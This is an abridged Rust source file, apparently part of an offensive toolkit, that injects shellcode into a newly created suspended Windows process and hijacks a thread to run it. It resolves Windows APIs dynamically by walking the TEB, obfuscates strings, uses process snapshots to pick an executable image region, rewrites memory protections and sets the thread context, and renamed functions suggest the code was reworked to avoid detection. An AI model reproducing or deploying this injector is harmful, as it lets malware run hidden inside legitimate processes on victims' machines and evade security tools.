...
use winapi::{
    ...
    shared::{
        basetsd::SIZE_T,
        minwindef::{DWORD, FALSE, FARPROC, HMODULE, LPVOID},
        winerror::ERROR_SUCCESS,
    },
    um::{
        processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOA},
        processsnapshot::{
            PSS_CAPTURE_FLAGS as PSS_CAPTURE_FLAGS_winapi,
...
//make a helper function for calling inj_s so we can keep inj_s private
pub fn snapin(process_name: &str, shellcode: &[u8]) -> Result<(), String> {
    inj_s(process_name, shellcode)
}

//formerly inject_shellcode
fn inj_s(process_name: &str, shellcode: &[u8]) -> Result<(), String> {
    //get the teb with noldr
    let teb = get_teb();

    let kernel32 = match get_dll_address(lc!("kernel32.dll").to_string(), teb) {
        Some(addr) => addr,
        None => return Err(lc!("Failed to get kernel32.dll address").to_string()),
    };
    ...
    if pi.hProcess.is_null() || pi.hThread.is_null() {
        return Err(lc!("Failed to create suspended process").to_string());
    }
    ...
    let shellcode_location = get_hi_address(process_handle, shellcode_size, kernel32 as *mut std_c_void)
        .map_err(|_e| lc!(&format!("Failed to get injection address: {}", _e)))?;

    //formerly inj_and_rwx
    if !inj_and_mod(process_handle, shellcode_location, shellcode, kernel32 as *mut std_c_void) {
        return Err(lc!("Failed to inject shellcode").to_string());
    }
    ...
    if !snap_thread_h(
        ...
        return Err(lc!("Failed to hijack thread").to_string());
    }
...
fn CreateSProcess(
    ...
    let function_address = match get_function_address(kernel32, "CreateProcessA") {
        Some(addr) => addr,
        None => {
            println!("{}", lc!("Failed to get CreateProcessA address"));
...
fn get_hi_address(
    ...
    // Capture snapshot
    let capture_flags: PSS_CAPTURE_FLAGS_winapi =
    ...
    let pss_capture_snapshot_address = noldr::get_function_address(kernel32, lc!("PssCaptureSnapshot").as_str());

    let pss_capture_snapshot = unsafe {
        let fn_ptr = match pss_capture_snapshot_address {
            Some(addr) => addr,
            None => return Err(lc!("Failed to get PssCaptureSnapshot address").to_string()),
        };

        std::mem::transmute::<
            _,
            extern "system" fn(HANDLE, PSS_CAPTURE_FLAGS_winapi, u32, *mut HPSS) -> u32,
        >(fn_ptr)
    };
    ...
    if pss_result != 0 {
        eprintln!("{}", lc!("[!] PssCaptureSnapshot failed: Win32 error {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        }));
        return Err(lc!("Failed to capture snapshot").to_string());
    }
    ...
    let pss_walk_marker_create_address =
        noldr::get_function_address(kernel32, lc!("PssWalkMarkerCreate").as_str());
    ...
    let pss_result = unsafe {
        std::mem::transmute::<_, PssWalkMarkerCreateFn>(match pss_walk_marker_create_address {
            Some(addr) => addr,
            None => return Err(lc!("Failed to get PssWalkMarkerCreate address").to_string()),
        })(std::ptr::null(), &mut walker)
    };

    if pss_result != 0 {
        eprintln!("{}", lc!("[!] PssWalkMarkerCreate failed: Win32 error {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        }));
        return Err(lc!("Failed to create walk marker").to_string());
    }
    ...
    let pss_walk_snapshot_address = noldr::get_function_address(kernel32, lc!("PssWalkSnapshot").as_str());
    ...
    let pss_success = unsafe {
        let result = std::mem::transmute::<_, PssWalkSnapshotFn>(match pss_walk_snapshot_address {
            Some(addr) => addr,
            None => return Err(lc!("Failed to get PssWalkSnapshot address").to_string()),
        })(
            snapshot_handle,
            PSS_WALK_VA_SPACE,
            walker,
        ...
        if mem_basic_info.Protect == 0x20 {
            ...
            if va_space_entry.Type == MEM_IMAGE {
                ...
                if va_space_entry.SizeOfImage > 1000000 {
                    ...
                    let read_process_memory_address =
                        noldr::get_function_address(kernel32, lc!("ReadProcessMemory").as_str());
                    ...
                    let read_process_memory = unsafe {
                        std::mem::transmute::<_, ReadProcessMemoryFn>(
                            match read_process_memory_address {
                                Some(addr) => addr,
                                None => {
                                    return Err(lc!("Failed to get ReadProcessMemory address").to_string())
                                }
                            },
                        )(
                            target_process,
                    ...
                    let get_process_heap_address =
                        noldr::get_function_address(kernel32, lc!("GetProcessHeap").as_str());

                    //check if the address is valid
                    if get_process_heap_address.is_none() {
                        return Err(lc!("Failed to get GetProcessHeap address").to_string());
                    }
                    ...
                    let heap = unsafe {
                        let func = std::mem::transmute::<_, GetProcessHeapFn>(
                            get_process_heap_address.unwrap(),
                        );
                        (func)() // Call the function directly rather than through another transmute
                    };

                    //locate the function address for HeapAlloc
                    let heap_alloc_address = noldr::get_function_address(kernel32, lc!("HeapAlloc").as_str())
                        .map(|addr| unsafe {
                            resolve_forwarded_export(kernel32, addr as *const ())
                        });
                    ...
                    let stack = unsafe {
                        let heap_alloc_fn: HeapAllocFn =
                            std::mem::transmute(heap_alloc_address.unwrap());

                        heap_alloc_fn(heap, HEAP_ZERO_MEMORY, mem_basic_info.RegionSize as usize)
                    };
                    ...
                    if !stack.is_null() {
                        ...
                        let heap_free_address = noldr::get_function_address(kernel32, lc!("HeapFree").as_str());
                        ...
                        let pss_walk_marker_free_address =
                            noldr::get_function_address(kernel32, lc!("PssWalkMarkerFree").as_str());

                        //define the function signature
                        type PssWalkMarkerFreeFn =
                            unsafe extern "system" fn(HPSSWALK) -> winapi::shared::minwindef::BOOL;

                        //call the function
                        let pss_walk_marker_free = unsafe {
                            std::mem::transmute::<_, PssWalkMarkerFreeFn>(
                                pss_walk_marker_free_address.unwrap(),
                            )
                        };
    ...
    //locate the function address for PssWalkMarkerFree
    let pss_walk_marker_free_address = noldr::get_function_address(kernel32, lc!("PssWalkMarkerFree").as_str());
    ...
    //unsafe { PssWalkMarkerFree(walker) };
    Err(lc!("No suitable injection location found").to_string())
}
...
fn inj_and_mod(
    ...
    //locate the function address for VirtualProtectEx
    let virtual_protect_ex_address = noldr::get_function_address(kernel32, lc!("VirtualProtectEx").as_str());
    ...
    //call the function
    let virtual_protect_ex = unsafe {
        std::mem::transmute::<_, VirtualProtectExFn>(virtual_protect_ex_address.unwrap())
    };
    ...
    {
        eprintln!("{}", lc!("[!] VirtualProtectEx FAILED with Error: {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        }));
        return false;
    }

    //locate the function address for WriteProcessMemory
    let write_process_memory_address = noldr::get_function_address(kernel32, lc!("WriteProcessMemory").as_str());
    ...
    //transmute the function
    let write_process_memory = unsafe {
        std::mem::transmute::<_, WriteProcessMemoryFn>(write_process_memory_address.unwrap())
    };

    //call and check if the function call was successful
    if unsafe {
    ...
    {
        eprintln!("{}", lc!("[!] WriteProcessMemory FAILED with Error: {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        }));
        return false;
    }

    //2nd call to VirtualProtectEx to set PAGE_EXECUTE_READ
    if unsafe {
        virtual_protect_ex(
            process_handle,
            shellcode_location,
...
fn snap_thread_h(
    ...
    unsafe {
        ...
        let pss_capture_snapshot_address =
            noldr::get_function_address(kernel32, lc!("PssCaptureSnapshot").as_str());
        ...
        if pss_result != 0 {
            eprintln!("{}", lc!("[!] PssCaptureSnapshot failed: Win32 error {}", winapi::um::errhandlingapi::GetLastError()));
            return false;
        }
            ...
            if thread_entry.ThreadId == thread_id {
                ...
                if !thread_entry.ContextRecord.is_null() {
                    ...
                    let set_thread_context_address =
                        noldr::get_function_address(kernel32, lc!("SetThreadContext").as_str());
                    ...
                    if set_thread_context(thread_handle, &snapshot_ctx) == FALSE {
                        eprintln!("{}", lc!("[!] SetThreadContext FAILED with Error: {}", winapi::um::errhandlingapi::GetLastError()));
                        return false;
                    }
                    ...
                    let debug_active_process_stop_address =
                        noldr::get_function_address(kernel32, lc!("DebugActiveProcessStop").as_str());
                    ...
                    if debug_active_process_stop(pid) == FALSE {
                        eprintln!("{}", lc!("[!] DebugActiveProcessStop FAILED with Error: {}", winapi::um::errhandlingapi::GetLastError()));
                        return false;
                    }
        ...
        if pss_result != 0 {
            eprintln!("{}", lc!("[!] PssWalkMarkerFree failed: Win32 error {}", winapi::um::errhandlingapi::GetLastError()));
            return false;
        }
...
unsafe fn resolve_forwarded_export(kernel32: *mut std_c_void, address: *const ()) -> *const () {
    ...
    if (address as usize) >= export_start && (address as usize) <= export_end {
        ...
        let get_proc_address = get_function_address(kernel32, lc!("GetProcAddress").as_str());

        //call GetProcAddress
        let get_proc_address_fn =
            unsafe { std::mem::transmute::<_, GetProcAddressFn>(get_proc_address.unwrap()) };

        //define the function signature
        type GetProcAddressFn = unsafe extern "system" fn(HMODULE, LPCSTR) -> FARPROC;

        let heap_alloc_str = std::ffi::CString::new(lc!("HeapAlloc").as_str()).unwrap();
        ...
        let get_proc_address_result =
            get_proc_address_fn(kernel32 as _, heap_alloc_str.as_ptr()) as *const ();
